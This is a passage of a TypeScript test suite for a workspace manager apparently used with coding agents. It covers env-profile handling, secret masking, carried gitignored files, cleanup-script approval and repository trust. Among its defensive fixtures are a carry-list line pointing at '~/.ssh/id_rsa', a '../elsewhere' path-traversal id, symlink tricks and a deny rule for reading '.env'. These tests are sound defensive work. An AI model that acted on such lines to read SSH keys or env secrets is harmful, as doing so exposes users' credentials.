    expect(workspace?.envProfile).toBeNull()
  })

  it('moves every reference when a set is renamed', async () => {
    // A rename that left the project pointing at the old name would silently
    // give every workspace nothing at all.
    const { projectId, workspaceId } = await withWorkspace()
    // A set with no file is not a set: `default` is only a name until something
    // is written into it.
    await service.saveEnvProfile(projectId, 'default', 'A=1\n')
    await service.createEnvProfile(projectId, 'prod', null)
    await service.setWorkspaceEnvProfile(workspaceId, 'prod')

    await service.renameEnvProfile(projectId, 'default', 'dev')
    await service.updateProjectById(projectId, { envProfile: 'dev' })
    await service.renameEnvProfile(projectId, 'dev', 'staging')

    expect(service.listProjects().find((p) => p.id === projectId)?.envProfile).toBe('staging')
  })

  it('follows a renamed set on the workspaces that were pinned to it', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.createEnvProfile(projectId, 'prod', null)
    await service.setWorkspaceEnvProfile(workspaceId, 'prod')

    await service.renameEnvProfile(projectId, 'prod', 'production')

    const workspace = (await service.listWorkspaces(projectId)).find((w) => w.id === workspaceId)
    expect(workspace?.envProfile).toBe('production')
  })

  it('rewrites every reference when a set is deleted', async () => {
    /*
     * In the same commit as the delete, so `state.json` never holds a reference
     * to a set that is not there.
     */
    const { projectId, workspaceId } = await withWorkspace()
    await service.createEnvProfile(projectId, 'prod', null)
    await service.setWorkspaceEnvProfile(workspaceId, 'prod')

    await service.removeEnvProfile(projectId, 'prod')

    const workspace = (await service.listWorkspaces(projectId)).find((w) => w.id === workspaceId)
    expect(workspace?.envProfile).toBeNull()
  })

  it('moves the project onto what is left when its own default goes', async () => {
    const { projectId } = await withWorkspace()
    await service.saveEnvProfile(projectId, 'default', 'A=1\n')
    await service.createEnvProfile(projectId, 'prod', null)

    await service.removeEnvProfile(projectId, 'default')

    expect(service.listProjects().find((p) => p.id === projectId)?.envProfile).toBe('prod')
  })

  it('names the set a new project would start with when the last one goes', async () => {
    const { projectId } = await withWorkspace()
    await service.saveEnvProfile(projectId, 'default', 'A=1\n')

    await service.removeEnvProfile(projectId, 'default')

    expect(service.listProjects().find((p) => p.id === projectId)?.envProfile).toBe('default')
  })

  it('copies one when asked', async () => {
    const { projectId } = await withWorkspace()
    await service.saveEnvProfile(projectId, 'default', 'A=1\n')

    await service.createEnvProfile(projectId, 'prod', 'default')

    await expect(service.readEnvProfile(projectId, 'prod')).resolves.toBe('A=1\n')
  })

  it('refuses a project it does not know', async () => {
    await expect(service.listEnvProfiles('missing')).rejects.toThrow()
    await expect(service.readEnvProfile('missing', 'default')).rejects.toThrow()
    await expect(service.saveEnvProfile('missing', 'default', '')).rejects.toThrow()
    await expect(service.createEnvProfile('missing', 'x', null)).rejects.toThrow()
    await expect(service.renameEnvProfile('missing', 'a', 'b')).rejects.toThrow()
    await expect(service.removeEnvProfile('missing', 'a')).rejects.toThrow()
    await expect(service.setWorkspaceEnvProfile('missing', null)).rejects.toThrow()
  })

  it("moves a project's single env file into the directory on start", async () => {
    /*
     * The migration, over a data root written by the version before this one.
     * The directory's presence is the marker, so it runs once and then costs a
     * `readdir` per project.
     */
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const directory = join(dir, 'data', 'projects', project.id)
    await rm(join(directory, 'envs'), { recursive: true, force: true })
    await mkdir(directory, { recursive: true })
    await writeFile(join(directory, 'env'), 'API_KEY=secret\n', 'utf8')

    const restarted = await createService(paths(dir))

    await expect(restarted.readEnvProfile(project.id, 'default')).resolves.toBe('API_KEY=secret\n')
  })
})

describe('what Help is told about a workspace', () => {
  async function withWorkspace(): Promise<{
    projectId: string
    workspaceId: string
    repoPath: string
  }> {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    // The project's own, which git has canonicalised: `/var` is `/private/var`.
    return { projectId: project.id, workspaceId: workspace.id, repoPath: project.repoPath }
  }

  it('names the variables of the set in effect, and never their values', async () => {
    const { projectId, workspaceId, repoPath } = await withWorkspace()
    await service.saveEnvProfile(
      projectId,
      'default',
      'API_KEY=sentinel-secret-value\nDB_NAME=app_$OCTOPUS_WORKSPACE_SLUG\n'
    )

    const context = await service.helpContext(workspaceId, [])

    expect(context).toMatchObject({
      rootPath: repoPath,
      envFile: '.env',
      profile: 'default',
      variableNames: ['API_KEY', 'DB_NAME'],
      envProblems: []
    })
    expect(JSON.stringify(context)).not.toContain('sentinel-secret-value')
    expect(JSON.stringify(context)).not.toContain('app_')
  })

  // A problem whose subject is the whole line — which may be a pasted secret.
  it('reports a line that is not an assignment by its number alone', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.saveEnvProfile(projectId, 'default', 'A=1\nsk-live-pasted-token\nA=2\n')

    const { envProblems } = await service.helpContext(workspaceId, [])

    expect(envProblems).toEqual([
      { line: 2, reason: 'noAssignment' },
      { line: 3, reason: 'duplicate', subject: 'A' }
    ])
  })

  /*
   * A line's subject is text from it — what comes before its `=` for a bad
   * name, all of it for no assignment — so a pasted `KEY: value` and a line of
   * a key pasted without its quotes both put a secret there.
   */
  it('reports a badly named line by its number alone too', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.saveEnvProfile(
      projectId,
      'default',
      [
        'DATABASE_URL: postgres://app:hunter2@db.internal/app?sslmode=require',
        'PRIVATE_KEY=-----BEGIN KEY-----',
        'q3Zx/9Yp+abcDEF==',
        '-----END KEY-----',
        'A=1',
        'A=$OCTOPUS_PROT',
        ''
      ].join('\n')
    )

    const context = await service.helpContext(workspaceId, [])

    expect(JSON.stringify(context)).not.toContain('hunter2')
    expect(JSON.stringify(context)).not.toContain('q3Zx')
    expect(context.envProblems).toContainEqual({ line: 6, reason: 'duplicate', subject: 'A' })
    expect(context.envProblems).toContainEqual({
      line: 6,
      reason: 'unknownVariable',
      subject: 'OCTOPUS_PROT'
    })
  })

  it('answers for the set a workspace was put on, and does not fall back to the default', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.saveEnvProfile(projectId, 'default', 'DUMP_URL=s3://staging\n')
    await service.createEnvProfile(projectId, 'prod', null)
    await service.setWorkspaceEnvProfile(workspaceId, 'prod')
    await rm(projectEnvProfile(projectId, 'prod', join(dir, 'data')))

    await expect(service.helpContext(workspaceId, [])).resolves.toMatchObject({
      profile: 'prod',
      variableNames: [],
      envProblems: []
    })
  })

  it('names what a run would carry and the scripts it would run', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.saveProjectCarryList(projectId, '.env\nconfig/master.key\n')
    await service.saveProjectScript(projectId, 'run', '#!/bin/sh\nexec true\n')

    const context = await service.helpContext(workspaceId, [])

    expect(context.carry).toEqual(['.env', 'config/master.key'])
    expect(context.scripts).toEqual(await service.workspaceScripts(workspaceId))
    expect(context.scripts.scripts.run?.source).toBe('project')
  })

  it('does not take a line of a key pasted without quotes for a name', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.saveEnvProfile(
      projectId,
      'default',
      'KEY=-----BEGIN KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj\ndGhpc2lzYXNlY3JldA==\n'
    )

    const context = await service.helpContext(workspaceId, [])

    expect(context.variableNames).toEqual(['KEY'])
    expect(JSON.stringify(context)).not.toContain('dGhpc2')
  })

  const server = (raw: string): RecordedRun => ({
    purpose: 'run',
    outcome: { kind: 'running' },
    raw
  })

  it('masks the values of the set the workspace was put on, $ and all', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.createEnvProfile(projectId, 'prod', null)
    await service.saveEnvProfile(projectId, 'prod', 'DB_PASSWORD=Pa$$w0rd123\n')
    await service.setWorkspaceEnvProfile(workspaceId, 'prod')

    const { lastRuns } = await service.helpContext(workspaceId, [
      server('+ DB_PASSWORD=Pa$$w0rd123')
    ])

    expect(lastRuns).toEqual([
      { purpose: 'run', outcome: { kind: 'running' }, output: '+ DB_PASSWORD=[DB_PASSWORD]' }
    ])
  })

  // The file keeps what the run was given until the next run rewrites it.
  it('masks what the last run was given after the set has changed', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.saveEnvProfile(projectId, 'default', 'API_KEY=rotated-away-value\n')
    await service.prepareWorkspace(workspaceId)
    await service.saveEnvProfile(projectId, 'default', 'API_KEY=the-new-value\n')

    const { lastRuns } = await service.helpContext(workspaceId, [
      server('sent rotated-away-value, then the-new-value')
    ])

    expect(lastRuns[0]?.output).toBe('sent [API_KEY], then [API_KEY]')
  })

  it('masks a carried env file the set never had', async () => {
    const { projectId, workspaceId, repoPath } = await withWorkspace()
    await writeFile(join(repoPath, '.env.development'), 'SMTP_PASSWORD=carried-secret\n', 'utf8')
    await service.saveProjectCarryList(projectId, '.env.development\n')
    await service.prepareWorkspace(workspaceId)

    const { lastRuns } = await service.helpContext(workspaceId, [
      server('auth failed for carried-secret')
    ])

    expect(lastRuns[0]?.output).toBe('auth failed for [SMTP_PASSWORD]')
  })

  it('leaves out a build on record once there is no build script to run', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    const build: RecordedRun = {
      purpose: 'setup',
      outcome: { kind: 'exited', at: '2026-10-22T09:41:00.000Z', exitCode: 1 },
      raw: 'old failure'
    }
    const runs = [build, server('listening')]

    const before = await service.helpContext(workspaceId, runs)
    expect(before.lastRuns.map(({ purpose }) => purpose)).toEqual(['run'])

    await service.saveProjectScript(projectId, 'setup', '#!/bin/sh\nnpm install\n')
    const after = await service.helpContext(workspaceId, runs)
    expect(after.lastRuns.map(({ purpose }) => purpose)).toEqual(['setup', 'run'])
  })

  it('masks a refusal’s reason as it masks output', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.saveEnvProfile(projectId, 'default', 'DB_PASSWORD=Pa$$w0rd123\n')

    const { lastRuns } = await service.helpContext(workspaceId, [
      { purpose: 'run', outcome: { kind: 'refused', reason: 'bad Pa$$w0rd123' }, raw: '' }
    ])

    expect(lastRuns[0]?.outcome).toEqual({ kind: 'refused', reason: 'bad [DB_PASSWORD]' })
  })

  it('refuses a workspace it does not know', async () => {
    await expect(service.helpContext('planner/nobody', [])).rejects.toMatchObject({
      code: 'worktreeMissing'
    })
  })
})

describe('removing a project', () => {
  it("runs each workspace's cleanup and deletes what the project kept here", async () => {
    /*
     * The moment there is most to clean up, and the one that used to clean up
     * nothing: the databases every workspace had been given were abandoned.
     */
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const first = await service.createWorkspaceIn(project.id)
    const second = await service.createWorkspaceIn(project.id)

    const marker = join(dir, 'cleaned.txt')
    await service.saveProjectScript(
      project.id,
      'archive',
      `#!/bin/sh\nprintf '%s\\n' "$OCTOPUS_WORKSPACE_SLUG" >> '${marker}'\n`
    )

    await service.removeProjectById(project.id)

    const ran = (await readFile(marker, 'utf8')).trim().split('\n').sort()
    expect(ran).toEqual([first.name, second.name].sort())

    // And the credentials with it: an env block left behind is inherited by
    // whatever project next takes the same id.
    await expect(stat(join(dir, 'data', 'projects', project.id))).rejects.toThrow()
    expect(service.listProjects()).toHaveLength(0)
  })

  it('removes the project even when the repository scripts cannot be read', async () => {
    // Worse than the workspace case: one odd layout in one worktree used to
    // make the whole project impossible to remove.
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    await mkdir(join(dir, 'elsewhere'), { recursive: true })
    await symlink(join(dir, 'elsewhere'), join(workspace.path, '.octopus'))

    await expect(service.removeProjectById(project.id)).resolves.toBeUndefined()
    expect(service.listProjects()).toHaveLength(0)
  })

  it("does not run a repository's cleanup script for a project nobody has read it in", async () => {
    /*
     * The unattended path. Removing a project runs a script per workspace with
     * nobody watching, so the gate matters more here than anywhere — and it was
     * a hand-copied duplicate of the one in `removeWorkspaceById` with no test
     * of its own.
     */
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    const marker = join(dir, 'project-cleanup.txt')
    await carryScript(workspace.path, 'archive.sh', `#!/bin/sh\nprintf ran > '${marker}'\n`)

    await service.removeProjectById(project.id)

    await expect(readFile(marker, 'utf8')).rejects.toThrow()
  })

  it("runs a repository's cleanup script for every workspace once it has been read", async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    const marker = join(dir, 'project-cleanup-approved.txt')
    await carryScript(
      workspace.path,
      'archive.sh',
      `#!/bin/sh\nprintf '%s' "$OCTOPUS_WORKSPACE_NAME" > '${marker}'\n`
    )
    await approveScriptsIn(service, workspace.id)

    await service.removeProjectById(project.id)

    await expect(readFile(marker, 'utf8')).resolves.toBe(workspace.name)
  })

  it('removes the project even when the cleanup script fails', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    await service.createWorkspaceIn(project.id)
    await service.saveProjectScript(project.id, 'archive', '#!/bin/sh\nexit 3\n')

    await expect(service.removeProjectById(project.id)).resolves.toBeUndefined()
    expect(service.listProjects()).toHaveLength(0)
  })

  it('cleans up after a project whose record has already gone', async () => {
    // A directory nothing points at is exactly the case worth removing, so the
    // delete runs whether or not the project is still in state.
    await expect(service.removeProjectById('never-existed')).resolves.toBeUndefined()
  })

  it('does not raise when the stored settings cannot be deleted', async () => {
    /*
     * The delete swallows its own failure because it runs after the commit: the
     * project is already gone from the app, and a leftover directory is debris
     * rather than a reason to fail. An id that could never name one is the
     * cheapest way to make it fail on purpose.
     */
    await expect(service.removeProjectById('../elsewhere')).resolves.toBeUndefined()
  })
})

describe('what Claude Code’s own settings allow', () => {
  /*
   * A rule in these files is honoured — the SDK approves a matching call before
   * `canUseTool` is consulted — and octopus could neither see it nor say it was
   * there, so a question that stopped being asked had no explanation.
   */
  it('reads the rules out of the checkout', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    await mkdir(join(repo, '.claude'), { recursive: true })
    await writeFile(
      join(repo, '.claude', 'settings.json'),
      JSON.stringify({ permissions: { allow: ['Bash(npm run:*)'], deny: ['Read(./.env)'] } }),
      'utf8'
    )
    const project = await service.addProjectFromPath(repo)

    await expect(service.readCliPermissions(project.id)).resolves.toEqual([
      {
        scope: 'project',
        verdict: 'deny',
        rule: { toolName: 'Read', ruleContent: './.env' },
        from: '.claude/settings.json'
      },
      {
        scope: 'project',
        verdict: 'allow',
        rule: { toolName: 'Bash', ruleContent: 'npm run:*' },
        from: '.claude/settings.json'
      }
    ])
  })

  it('refuses a project it does not have', async () => {
    await expect(service.readCliPermissions('missing')).rejects.toThrow()
  })
})

describe('a pasted image', () => {
  /* The one attachment octopus stores. A file dragged onto the composer or
     chosen from disk keeps its own path and is never copied — the message
     carries the path — but a clipboard holds a picture rather than a file. */
  it('writes it under the data root and answers with where it landed', async () => {
    const path = await service.writePastedAttachment('image/png', Uint8Array.from([1, 2, 3]))

    expect(path.startsWith(join(dir, 'data', 'attachments'))).toBe(true)
    await expect(readFile(path)).resolves.toEqual(Buffer.from([1, 2, 3]))
  })

  it('refuses a type it cannot name a file after', async () => {
    await expect(
      service.writePastedAttachment('application/x-sh', Uint8Array.from([1]))
    ).rejects.toMatchObject({ code: 'attachmentType' })
  })
})

describe('the sides a diff is coloured from', () => {
  /*
   * From the same read as the diff: the two describe one tree, and a pane
   * holding a diff from one moment and sides from another would colour lines
   * by numbers that had moved.
   */
  async function withChange(): Promise<{ service: OctopusService; workspaceId: string }> {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const service = await createService(paths(dir))
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    await writeFile(join(workspace.path, 'README.md'), '# changed\n', 'utf8')
    return { service, workspaceId: workspace.id }
  }

  it('answers with both whole sides of a changed file', async () => {
    const { service, workspaceId } = await withChange()

    await expect(service.readWorkspaceChanges(workspaceId)).resolves.toMatchObject({
      sides: { 'README.md': { current: '# changed' } }
    })
  })

  it('refuses a workspace it does not have', async () => {
    const { service } = await withChange()

    await expect(service.readWorkspaceChanges('missing')).rejects.toThrow()
  })
})

describe('files carried into a workspace', () => {
  async function withProject(): Promise<{ id: string; repo: string }> {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    return { id: (await service.addProjectFromPath(repo)).id, repo }
  }

  // `.env` alone: the file almost every project needs and the one nobody
  // expects to have to ask for.
  it('starts from a list naming the env', async () => {
    const { id } = await withProject()
    await expect(service.readProjectCarryList(id)).resolves.toContain('.env')
  })

  it('reads back the list it saved', async () => {
    const { id } = await withProject()
    await service.saveProjectCarryList(id, '.env\nconfig/master.key\n')

    await expect(service.readProjectCarryList(id)).resolves.toBe('.env\nconfig/master.key\n')
  })

  /*
   * The whole point: a worktree holds what git tracks and nothing else, so a
   * gitignored secret is missing from every fresh one.
   */
  it('carries a gitignored file out of the checkout', async () => {
    const { id, repo } = await withProject()
    await writeFile(join(repo, '.env'), 'API_KEY=secret\n', 'utf8')
    await mkdir(join(repo, 'config'), { recursive: true })
    await writeFile(join(repo, 'config', 'master.key'), 'abc123\n', 'utf8')
    await service.saveProjectCarryList(id, '.env\nconfig/master.key\n')

    const workspace = await service.createWorkspaceIn(id)

    await expect(readFile(join(workspace.path, '.env'), 'utf8')).resolves.toBe('API_KEY=secret\n')
    await expect(readFile(join(workspace.path, 'config', 'master.key'), 'utf8')).resolves.toBe(
      'abc123\n'
    )
  })

  /*
   * Both halves, because they are different answers. `.env` is already there
   * from creation, so a second pass writes nothing and says nothing — while
   * `not-there` is named every time, which is the whole point: a run that goes
   * ahead without a file the list promised needs to say which one.
   */
  it('says what it carried and what it could not', async () => {
    const { id, repo } = await withProject()
    await writeFile(join(repo, '.env'), 'A=1\n', 'utf8')
    await service.saveProjectCarryList(id, '.env\nnot-there\n')

    const workspace = await service.createWorkspaceIn(id)

    await expect(service.prepareWorkspace(workspace.id)).resolves.toEqual({
      written: [],
      missing: ['not-there'],
      profile: 'default',
      variables: {}
    })
  })

  // A workspace made before the list mentioned a file picks it up rather than
  // staying broken until it is recreated.
  it('fills in a file the list gained later', async () => {
    const { id, repo } = await withProject()
    const workspace = await service.createWorkspaceIn(id)

    await writeFile(join(repo, 'later.txt'), 'hello\n', 'utf8')
    await service.saveProjectCarryList(id, 'later.txt\n')

    await expect(service.prepareWorkspace(workspace.id)).resolves.toEqual({
      written: ['later.txt'],
      missing: [],
      profile: 'default',
      variables: {}
    })
    await expect(readFile(join(workspace.path, 'later.txt'), 'utf8')).resolves.toBe('hello\n')
  })

  it('never writes over what the workspace already has', async () => {
    const { id, repo } = await withProject()
    await writeFile(join(repo, '.env'), 'FROM=checkout\n', 'utf8')
    await service.saveProjectCarryList(id, '.env\n')

    const workspace = await service.createWorkspaceIn(id)
    await writeFile(join(workspace.path, '.env'), 'FROM=hand\n', 'utf8')

    await expect(service.prepareWorkspace(workspace.id)).resolves.toEqual({
      written: [],
      missing: [],
      profile: 'default',
      variables: {}
    })
    await expect(readFile(join(workspace.path, '.env'), 'utf8')).resolves.toBe('FROM=hand\n')
  })

  it('refuses to touch a project or workspace that does not exist', async () => {
    await expect(service.readProjectCarryList('missing')).rejects.toThrow()
    await expect(service.saveProjectCarryList('missing', '.env')).rejects.toThrow()
    await expect(service.prepareWorkspace('missing')).rejects.toThrow()
  })
})

describe('settings a repository carries', () => {
  async function withProject(): Promise<{ id: string; repo: string }> {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    return { id: (await service.addProjectFromPath(repo)).id, repo }
  }

  /** Puts a file inside the repository's `.octopus/`, making its parents. */
  async function carry(repo: string, relative: string, contents: string): Promise<void> {
    const path = join(repo, '.octopus', relative)
    await mkdir(join(path, '..'), { recursive: true })
    await writeFile(path, contents, 'utf8')
  }

  it('reports a repository that carries nothing', async () => {
    const { id } = await withProject()

    const view = await service.projectRepoConfig(id)

    expect(view.present).toBe(false)
    expect(view.ignored).toBe(false)
  })

  // The project's own fields are the one item that always exists on this side,
  // so a repository carrying nothing still has something to offer outward.
  it('always has the project fields to export, and nothing else untouched', async () => {
    const { id } = await withProject()

    const view = await service.projectRepoConfig(id)

    expect(view.items.map((item) => item.id)).toEqual(['project'])
    expect(view.items[0]?.state).toBe('onlyInApp')
    expect(view.items[0]?.app).toContain('"baseBranch": "main"')
  })

  it('tells what only the repository carries from what the two disagree about', async () => {
    const { id, repo } = await withProject()
    await carry(repo, 'carry', '.env\n')
    await carry(repo, join('scripts', 'setup.sh'), 'npm ci\n')
    await service.saveProjectScript(id, 'setup', 'npm install\n')

    const view = await service.projectRepoConfig(id)
    const byId = new Map(view.items.map((item) => [item.id, item]))

    expect(view.present).toBe(true)
    expect(byId.get('carry')?.state).toBe('onlyInRepository')
    expect(byId.get('script.setup')?.state).toBe('differs')
  })

  it('reports copies that agree', async () => {
    const { id, repo } = await withProject()
    await service.saveProjectScript(id, 'run', 'npm run dev\n')
    await carry(repo, join('scripts', 'run.sh'), 'npm run dev\n')

    const view = await service.projectRepoConfig(id)

    expect(view.items.find((item) => item.id === 'script.run')?.state).toBe('same')
  })

  // An ignored folder makes exporting into it a change nobody will ever
  // receive, which is worth saying before somebody exports twice.
  it('says when git would keep the folder out of a commit', async () => {
    const { id, repo } = await withProject()
    await writeFile(join(repo, '.gitignore'), '.octopus/\n', 'utf8')

    await expect(service.projectRepoConfig(id)).resolves.toMatchObject({ ignored: true })
  })

  it('writes only the items asked for, and skips what nobody wrote', async () => {
    const { id, repo } = await withProject()
    await service.saveProjectScript(id, 'setup', 'npm ci\n')

    const written = await service.exportRepoConfig(id, ['script.setup', 'script.run', 'carry'])

    expect(written).toEqual(['script.setup'])
    await expect(readFile(join(repo, '.octopus', 'scripts', 'setup.sh'), 'utf8')).resolves.toBe(
      'npm ci\n'
    )
    await expect(access(join(repo, '.octopus', 'carry'))).rejects.toThrow()
  })

  it('leaves a note in the folder explaining what reads it', async () => {
    const { id, repo } = await withProject()

    await service.exportRepoConfig(id, ['project'])

    await expect(readFile(join(repo, '.octopus', 'README.md'), 'utf8')).resolves.toContain(
      'No credentials'
    )
  })

  it('refuses both calls for a project that is not there', async () => {
    await expect(service.projectRepoConfig('gone')).rejects.toThrow(WorkspaceError)
    await expect(service.exportRepoConfig('gone', ['carry'])).rejects.toThrow(WorkspaceError)
  })

  /*
   * What a wiped installation does, and the reason the folder exists. Scripts,
   * instructions and the carry list are read live, so there is nothing to
   * bring back in; the look of the project is taken once, when it is added.
   */
  it('goes out and comes back by adding the project again', async () => {
    const { id, repo } = await withProject()
    await service.saveProjectScript(id, 'setup', 'npm ci\n')
    await service.saveProjectCarryList(id, '.env\nconfig/master.key\n')
    await service.saveProjectInstruction(id, 'review', '# Read it twice\n')
    await service.updateProjectById(id, { name: 'Planner', icon: 'rocket', color: 'teal' })

    await service.exportRepoConfig(id, ['script.setup', 'carry', 'instruction.review', 'project'])

    // A second installation, with nothing of its own.
    await writeFile(join(repo, '.gitignore'), '.env\nconfig/master.key\n', 'utf8')
    const fresh = await createService(paths(join(dir, 'second')))
    const other = await fresh.addProjectFromPath(repo)

    expect(other).toMatchObject({ name: 'Planner', icon: 'rocket', color: 'teal' })
    const sources = await fresh.projectSources(other.id, null)
    // Waiting for trust, as the env file a repository names does.
    expect(sources.find((view) => view.id === 'project.carry')).toMatchObject({
      effective: 'project',
      warning: 'repositoryNotTrusted'
    })
    expect(sources.find((view) => view.id === 'script.setup')?.effective).toBe('repository')
    expect(sources.find((view) => view.id === 'instruction.review')?.effective).toBe('repository')
  })

  /** Commits what the checkout holds, so a worktree cut from `main` has it too. */
  async function commitAll(repo: string, message: string): Promise<void> {
    await run('git', ['add', '-A'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', message], { cwd: repo })
  }

  /*
   * The list is read live, so copying it at add would only leave a stale
   * version behind — the reason the repository's never reached a project
   * already added.
   */
  it("does not copy the repository's carry list when a project is added", async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    await writeFile(join(repo, '.gitignore'), 'config/master.key\n', 'utf8')
    await carry(repo, 'carry', 'config/master.key\n')

    const project = await service.addProjectFromPath(repo)

    await expect(service.readProjectCarryList(project.id)).resolves.not.toContain('master.key')
  })

  /*
   * The bug: a list changed upstream never reached a project already added.
   * Committed after the add, and carried all the same.
   */
  it('carries what a branch adds to the list, for a project added before it did', async () => {
    const { id, repo } = await withProject()
    await service.updateProjectById(id, { trustRepository: true })
    await service.saveProjectCarryList(id, '')
    await writeFile(join(repo, '.gitignore'), 'config/master.key\n', 'utf8')
    await carry(repo, 'carry', 'config/master.key = ~/.ssh/id_rsa\n')
    await commitAll(repo, 'carry the key')
    await mkdir(join(repo, 'config'), { recursive: true })
    await writeFile(join(repo, 'config', 'master.key'), 'abc123\n', 'utf8')

    const workspace = await service.createWorkspaceIn(id)

    // From the checkout, as a bare line's file is — never from the source the
    // repository named.
    await expect(readFile(join(workspace.path, 'config', 'master.key'), 'utf8')).resolves.toBe(
      'abc123\n'
    )
  })

  /*
   * Asked of the worktree, not the checkout. The checkout ignores `.env` here
   * and the branch does not, so obeying the checkout's answer would put the
   * real `.env` where the branch's `git add -A` commits it.
   */
  it('skips a repository line the worktree would commit', async () => {
    const { id, repo } = await withProject()
    await service.updateProjectById(id, { trustRepository: true })
    await service.saveProjectCarryList(id, '')
    await carry(repo, 'carry', '.env\n')
    await commitAll(repo, 'carry the env')
    await writeFile(join(repo, '.gitignore'), '.env\n', 'utf8')
    await writeFile(join(repo, '.env'), 'API_KEY=secret\n', 'utf8')

    const workspace = await service.createWorkspaceIn(id)

    await expect(access(join(workspace.path, '.env'))).rejects.toThrow()
  })

  /*
   * A run prepares the worktree's working tree, which the agent writes. An
   * untrusted repository's list could be the agent's own, so it waits.
   */
  it("carries the project's own list alone until the repository is trusted", async () => {
    const { id, repo } = await withProject()
    await service.saveProjectCarryList(id, '')
    await writeFile(join(repo, '.gitignore'), 'config/master.key\n', 'utf8')
    await carry(repo, 'carry', 'config/master.key\n')
    await commitAll(repo, 'carry the key')
    await mkdir(join(repo, 'config'), { recursive: true })
    await writeFile(join(repo, 'config', 'master.key'), 'abc123\n', 'utf8')

    const workspace = await service.createWorkspaceIn(id)

    await expect(access(join(workspace.path, 'config', 'master.key'))).rejects.toThrow()
  })

  // Degraded, as the live fields are: a bad file in a branch does not stop
  // the workspace being made, and the project's own list still arrives.
  it("makes the workspace with the project's own list when the branch's is a link", async () => {
    const { id, repo } = await withProject()
    await service.updateProjectById(id, { trustRepository: true })
    await mkdir(join(repo, '.octopus'), { recursive: true })
    await symlink(join(repo, 'README.md'), join(repo, '.octopus', 'carry'))
    await commitAll(repo, 'a linked list')
    await writeFile(join(repo, '.env'), 'A=1\n', 'utf8')
    await service.saveProjectCarryList(id, '.env\n')

    const workspace = await service.createWorkspaceIn(id)

    await expect(readFile(join(workspace.path, '.env'), 'utf8')).resolves.toBe('A=1\n')
  })

  it("carries the project's own list alone once the user chose it", async () => {
    const { id, repo } = await withProject()
    await service.saveProjectCarryList(id, '')
    await writeFile(join(repo, '.gitignore'), 'config/master.key\n', 'utf8')
    await carry(repo, 'carry', 'config/master.key\n')
    await commitAll(repo, 'carry the key')
    await mkdir(join(repo, 'config'), { recursive: true })
    await writeFile(join(repo, 'config', 'master.key'), 'abc123\n', 'utf8')
    await service.updateProjectById(id, { trustRepository: true })
    await service.editProjectById(id, { kind: 'preferLocal', item: 'project.carry', on: true })

    const workspace = await service.createWorkspaceIn(id)

    await expect(access(join(workspace.path, 'config', 'master.key'))).rejects.toThrow()
    const sources = await service.projectSources(id, workspace.id)
    expect(sources.find((view) => view.id === 'project.carry')).toMatchObject({
      effective: 'project',
      preferLocal: true
    })
  })

  // The base branch and env file stay live, so copying them would leave a
  // stale value for "use mine instead" to return to.
  it('does not copy the fields that stay live', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    await carry(repo, 'project.json', '{"name":"Planner","envFile":".env.local"}')

    const project = await service.addProjectFromPath(repo)

    expect(project).toMatchObject({ name: 'Planner', envFile: '.env' })
  })

  // A file that cannot be believed adds the project as if there were none.
  it('adds a project whose project.json cannot be read', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    await carry(repo, 'project.json', 'baseBranch: develop')

    await expect(service.addProjectFromPath(repo)).resolves.toMatchObject({ name: 'planner' })
  })

  it('refuses to read a repository whose folder is a symbolic link', async () => {
    const { id, repo } = await withProject()
    await mkdir(join(dir, 'elsewhere'), { recursive: true })
    await symlink(join(dir, 'elsewhere'), join(repo, '.octopus'))

    await expect(service.projectRepoConfig(id)).rejects.toMatchObject({
      code: 'repoConfigSymlink'
    })
  })
})

describe('scripts a repository supplies', () => {
  async function withWorkspace(): Promise<{
    projectId: string
    workspaceId: string
    repo: string
  }> {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    return { projectId: project.id, workspaceId: workspace.id, repo }
  }

  /** Writes into the **worktree**, which is where a run would read from. */
  async function inWorktree(workspaceId: string, relative: string, body: string): Promise<void> {
    const workspace = (await service.listWorkspaces('planner')).find(
      (candidate) => candidate.id === workspaceId
    )
    const path = join(workspace?.path ?? '', relative)
    await mkdir(join(path, '..'), { recursive: true })
    await writeFile(path, body, 'utf8')
  }

  it('has nothing to approve for a project whose scripts are its own', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.saveProjectScript(projectId, 'setup', '#!/bin/sh\nnpm install\n')

    const answer = await service.workspaceScripts(workspaceId)

    expect(answer.scripts.setup?.source).toBe('project')
    // Approved without asking: the user wrote it.
    expect(answer.approved).toBe(true)
  })

  it('does not run a repository script until it has been read', async () => {
